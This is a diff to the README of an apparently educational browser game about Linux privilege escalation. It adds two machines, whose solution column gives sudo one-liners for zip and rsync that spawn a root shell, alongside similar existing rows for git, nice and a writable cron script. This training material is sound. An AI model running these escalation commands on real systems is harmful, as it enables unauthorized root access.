@@ -1,6 +1,6 @@
 # rootQuest — Linux Privilege Escalation Playground
 
-A 100% browser-based, vanilla JS terminal game. 35 independent Linux machines, 35 different privilege-escalation vulnerabilities, sorted into difficulty tiers. Enumerate, identify, exploit, root.
+A 100% browser-based, vanilla JS terminal game. 37 independent Linux machines, 37 different privilege-escalation vulnerabilities, sorted into difficulty tiers. Enumerate, identify, exploit, root.
 
 ## Play
 
@@ -51,6 +51,8 @@ start index.html         # Windows
 | 33 | box-33 | Medium | Sudoers NOPASSWD on `git` — `-p` forces a pager that inherits root (GTFOBins) | `sudo git -p help !/bin/sh` |
 | 34 | box-34 | Easy | Sudoers NOPASSWD on `nice` — bare passthrough to whatever command follows (GTFOBins) | `sudo nice /bin/sh` |
 | 35 | box-35 | Easy | World-writable root cron script (monitoring agent) | Overwrite `/opt/monitor/healthcheck.sh`, `wait` |
+| 36 | box-36 | Easy | Sudoers NOPASSWD on `zip` — `-T --unzip-command` runs an arbitrary "unzip" hook (GTFOBins) | `sudo zip test.zip /etc/hosts -T --unzip-command="sh -c /bin/sh"` |
+| 37 | box-37 | Medium | Sudoers NOPASSWD on `rsync` — `-e` swaps the remote-shell program for a local shell (GTFOBins) | `sudo rsync -e "/bin/sh -c /bin/sh" 127.0.0.1:/dev/null /dev/null` |
 
 ## Controls
 
